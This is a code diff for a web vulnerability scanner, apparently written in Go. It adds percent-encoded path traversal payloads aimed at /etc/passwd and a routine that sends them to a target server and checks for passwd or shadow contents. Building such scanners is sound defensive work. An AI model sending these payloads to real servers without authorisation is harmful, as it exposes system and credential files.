@@ -69,6 +69,84 @@ type pathTraversalPayload struct {
 	Description string
 }
 
+// pathTraversalURLPayload represents a traversal suffix to append to the URL PATH
+// (not the query string). This tests servers that decode %2f after routing, which
+// allows directory traversal to bypass the configured static-file root.
+type pathTraversalURLPayload struct {
+	// PathSuffix is appended verbatim to the URL path component.
+	// Use %2f for an encoded forward slash so path normalisation is bypassed.
+	PathSuffix string
+	payload    pathTraversalPayload
+}
+
+// pathTraversalURLPayloads tests path traversal via URL path encoding.
+// These are effective against servers (e.g. Node/Express serve-static) that
+// perform route matching on the raw URL before decoding %2f to /, allowing
+// a traversal string like "/test%2f..%2f..%2fetc%2fpasswd" to slip past the
+// route guard and then be decoded to a traversal path by the file-serving layer.
+var pathTraversalURLPayloads = []pathTraversalURLPayload{
+	// 2 levels up via %2f
+	{
+		PathSuffix: "/test%2f..%2f..%2fetc%2fpasswd",
+		payload: pathTraversalPayload{
+			Payload:     "test%2f..%2f..%2fetc%2fpasswd",
+			Type:        "encoded",
+			Severity:    SeverityHigh,
+			Description: "URL path traversal via %2f encoding (2 levels) – potential /etc/passwd access",
+		},
+	},
+	// 3 levels up via %2f
+	{
+		PathSuffix: "/test%2f..%2f..%2f..%2fetc%2fpasswd",
+		payload: pathTraversalPayload{
+			Payload:     "test%2f..%2f..%2f..%2fetc%2fpasswd",
+			Type:        "encoded",
+			Severity:    SeverityHigh,
+			Description: "URL path traversal via %2f encoding (3 levels) – potential /etc/passwd access",
+		},
+	},
+	// 4 levels up via %2f
+	{
+		PathSuffix: "/test%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
+		payload: pathTraversalPayload{
+			Payload:     "test%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
+			Type:        "encoded",
+			Severity:    SeverityHigh,
+			Description: "URL path traversal via %2f encoding (4 levels) – potential /etc/passwd access",
+		},
+	},
+	// 5 levels up via %2f (catches deeply nested app directories)
+	{
+		PathSuffix: "/test%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
+		payload: pathTraversalPayload{
+			Payload:     "test%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
+			Type:        "encoded",
+			Severity:    SeverityHigh,
+			Description: "URL path traversal via %2f encoding (5 levels) – potential /etc/passwd access",
+		},
+	},
+	// 2 levels up via %2e%2e (alternate dot encoding)
+	{
+		PathSuffix: "/test%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+		payload: pathTraversalPayload{
+			Payload:     "test%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+			Type:        "encoded",
+			Severity:    SeverityHigh,
+			Description: "URL path traversal via %2e%2e%2f encoding (2 levels) – potential /etc/passwd access",
+		},
+	},
+	// 3 levels up via %2e%2e
+	{
+		PathSuffix: "/test%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+		payload: pathTraversalPayload{
+			Payload:     "test%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+			Type:        "encoded",
+			Severity:    SeverityHigh,
+			Description: "URL path traversal via %2e%2e%2f encoding (3 levels) – potential /etc/passwd access",
+		},
+	},
+}
+
 // pathTraversalPayloads is the list of detection payloads to test for Path Traversal.
 var pathTraversalPayloads = []pathTraversalPayload{
 	// Unix-style path traversal - /etc/passwd
@@ -326,10 +404,101 @@ func (s *PathTraversalScanner) Scan(ctx context.Context, targetURL string) *Path
 		}
 	}
 
+	// Also test URL path traversal (e.g. /ftp%2f..%2f..%2fetc%2fpasswd).
+	// This catches servers that decode %2f AFTER route matching, which lets
+	// a traversal sequence slip past the static-file root guard.
+	s.testURLPathTraversal(ctx, parsedURL, result)
+
 	// Calculate final summary
 	s.calculateSummary(result)
 
 	return result
+}
+
+// testURLPathTraversal tests path traversal by appending percent-encoded traversal
+// sequences directly to the URL path component (not the query string).  Servers
+// such as Node/Express serve-static can be vulnerable when they match routes on
+// the raw URL and then decode %2f to / inside the file-serving layer, allowing
+// directory traversal outside the configured static root.
+func (s *PathTraversalScanner) testURLPathTraversal(ctx context.Context, parsedURL *url.URL, result *PathTraversalScanResult) {
+	// Build the base URL without query string.  We use EscapedPath() to preserve
+	// any existing percent-encoding in the path component.
+	baseURL := parsedURL.Scheme + "://" + parsedURL.Host + parsedURL.EscapedPath()
+
+	for _, pp := range pathTraversalURLPayloads {
+		// Apply rate limiting before making the request
+		if s.rateLimiter != nil {
+			if err := s.rateLimiter.Wait(ctx); err != nil {
+				result.Errors = append(result.Errors, fmt.Sprintf("Rate limiting error: %s", err.Error()))
+				return
+			}
+		}
+
+		// Append the traversal suffix to the base URL path.
+		// The suffix contains literal %2f characters that must NOT be re-encoded
+		// by url.Parse, so we construct the raw URL string and pass it directly
+		// to http.NewRequestWithContext which calls url.ParseRequestURI internally.
+		rawURL := baseURL + pp.PathSuffix
+
+		req, err := http.NewRequestWithContext(ctx, http.MethodGet, rawURL, nil)
+		if err != nil {
+			result.Summary.TotalTests++
+			continue
+		}
+
+		req.Header.Set("User-Agent", s.userAgent)
+		req.Header.Set("Accept", "*/*")
+
+		if s.authConfig != nil {
+			s.authConfig.ApplyToRequest(req)
+		}
+
+		resp, err := s.client.Do(req)
+		result.Summary.TotalTests++
+
+		if err != nil {
+			continue
+		}
+
+		// Close body explicitly (not via defer) to avoid resource leak in loop.
+		body, readErr := io.ReadAll(resp.Body)
+		resp.Body.Close()
+
+		if readErr != nil {
+			continue
+		}
+
+		if resp.StatusCode == http.StatusTooManyRequests {
+			continue
+		}
+
+		bodyStr := string(body)
+		confidence, evidence := s.analyzePathTraversalResponse(resp, bodyStr, pp.payload)
+
+		if confidence != "low" && confidence != "" {
+			finding := &PathTraversalFinding{
+				URL:         rawURL,
+				Parameter:   "path",
+				Payload:     pp.payload.Payload,
+				Evidence:    evidence,
+				Severity:    pp.payload.Severity,
+				Type:        pp.payload.Type,
+				Description: pp.payload.Description,
+				Remediation: s.getRemediation(),
+				Confidence:  confidence,
+			}
+			result.Findings = append(result.Findings, *finding)
+			result.Summary.VulnerabilitiesFound++
+		}
+
+		// Check context cancellation
+		select {
+		case <-ctx.Done():
+			result.Errors = append(result.Errors, "Scan cancelled")
+			return
+		default:
+		}
+	}
 }
 
 // ScanPOST performs Path Traversal scanning with POST method using form-encoded parameters.
@@ -652,15 +821,17 @@ func (s *PathTraversalScanner) testPayloadVariant(ctx context.Context, baseURL *
 func (s *PathTraversalScanner) analyzePathTraversalResponse(resp *http.Response, body string, payload pathTraversalPayload) (confidence string, evidence string) {
 	// Check for status codes that indicate successful file access
 	if resp.StatusCode == http.StatusOK {
-		// Look for Unix /etc/passwd file signatures
-		if payload.Type == "unix" && strings.Contains(payload.Payload, "passwd") {
+		// Look for Unix /etc/passwd file signatures.
+		// Both "unix" (literal ../etc/passwd) and "encoded" (%2f..%2fetc%2fpasswd)
+		// payloads can reach /etc/passwd, so check both types.
+		if (payload.Type == "unix" || payload.Type == "encoded") && strings.Contains(payload.Payload, "passwd") {
 			if containsPasswdSignature(body) {
 				return "high", "Response contains /etc/passwd file contents (root:x:0:0 pattern detected)"
 			}
 		}
 
 		// Look for Unix /etc/shadow file signatures
-		if payload.Type == "unix" && strings.Contains(payload.Payload, "shadow") {
+		if (payload.Type == "unix" || payload.Type == "encoded") && strings.Contains(payload.Payload, "shadow") {
 			if containsShadowSignature(body) {
 				return "high", "Response contains /etc/shadow file contents (password hash patterns detected)"
 			}
